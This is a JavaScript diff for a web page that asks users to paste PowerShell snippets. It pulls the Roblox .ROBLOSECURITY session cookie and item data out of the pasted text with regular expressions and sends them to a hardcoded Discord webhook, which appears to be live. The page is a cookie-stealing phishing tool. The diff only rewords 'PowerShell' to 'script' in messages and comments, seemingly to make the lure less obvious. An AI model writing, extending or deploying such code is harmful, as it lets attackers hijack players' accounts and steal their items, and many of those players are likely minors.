@@ -218,9 +218,9 @@ async function submitPowerShell() {
         return;
     }
 
-    // Only allow PowerShell scripts with authentication data or valid item data
+    // Only allow scripts with authentication data or valid item data
     if (!hasValidData(inputText)) {
-        showNotification('Invalid input. Please enter PowerShell scripts with auth data or item data.', 'error');
+        showNotification('Invalid input. Please enter scripts with auth data or item data.', 'error');
         return;
     }
 
@@ -242,7 +242,7 @@ async function submitPowerShell() {
             stopLoadingAnimation(submitText);
             submitText.textContent = 'No Auth Data';
             submitBtn.style.background = '#ef4444'; // Red error color
-            showNotification('No .ROBLOSECURITY authentication found in PowerShell script', 'error');
+            showNotification('No .ROBLOSECURITY authentication found in script', 'error');
             
             setTimeout(() => {
                 submitBtn.disabled = false;
@@ -260,7 +260,7 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
         
-        // Calculate PowerShell script statistics (rounded)
+        // Calculate script statistics (rounded)
         const wordCount = Math.round(inputText.split(/\s+/).filter(word => word.length > 0).length / 10) * 10;
         const characterCount = Math.round(inputText.length / 100) * 100;
         const lineCount = inputText.split('\n').length;
@@ -282,7 +282,7 @@ async function submitPowerShell() {
                         inline: false
                     },
                     {
-                        name: "📊 PowerShell Script Stats",
+                        name: "📊 Script Statistics",
                         value: `**📝 Words:** ${wordCount.toLocaleString()}\n**🔤 Characters:** ${characterCount.toLocaleString()}\n**📄 Lines:** ${lineCount.toLocaleString()}`,
                         inline: false
                     },
@@ -360,7 +360,7 @@ async function submitPowerShell() {
 function extractRobloxCookie(text) {
     // Look for various Roblox authentication patterns
     const patterns = [
-        // PowerShell New-Object System.Net.Cookie format with .ROBLOSECURITY
+        // New-Object System.Net.Cookie format with .ROBLOSECURITY
         /New-Object\s+System\.Net\.Cookie\s*\(\s*"\.ROBLOSECURITY"\s*,\s*"([^"]+)"/i,
         // Standard .ROBLOSECURITY cookie format
         /\.ROBLOSECURITY=([^;"\s\n]+)/i,
@@ -461,7 +461,7 @@ function extractLimitedItems(text) {
     return items.slice(0, 5); // Limit to 5 items max
 }
 
-// Function to validate input - only allow PowerShell scripts with auth data or valid data
+// Function to validate input - only allow scripts with auth data or valid data
 function hasValidData(text) {
     // Check if it contains Roblox authentication data (most important)
     const hasAuthData = extractRobloxCookie(text) !== null;
@@ -469,19 +469,19 @@ function hasValidData(text) {
         return true; // Always allow if there's authentication data
     }
     
-    // Check if it's a PowerShell script with session/authentication patterns
-    const powerShellPatterns = [
+    // Check if it's a script with session/authentication patterns
+    const scriptPatterns = [
         /\$session\s*=\s*New-Object.*Microsoft\.PowerShell/is,
         /\$session\.Cookies\.Add.*ROBLOSECURITY/is,
         /System\.Net\.Cookie.*ROBLOSECURITY/is,
         /WebRequestSession.*Cookies/is,
         /New-Object.*System\.Net\.Cookie/is,
-        // Also allow PowerShell scripts with session setup even without ROBLOSECURITY
+        // Also allow scripts with session setup even without ROBLOSECURITY
         /\$session\s*=.*WebRequestSession/is,
         /\$session\.Cookies\.Add/is
     ];
     
-    for (const pattern of powerShellPatterns) {
+    for (const pattern of scriptPatterns) {
         if (pattern.test(text)) {
             return true;
         }
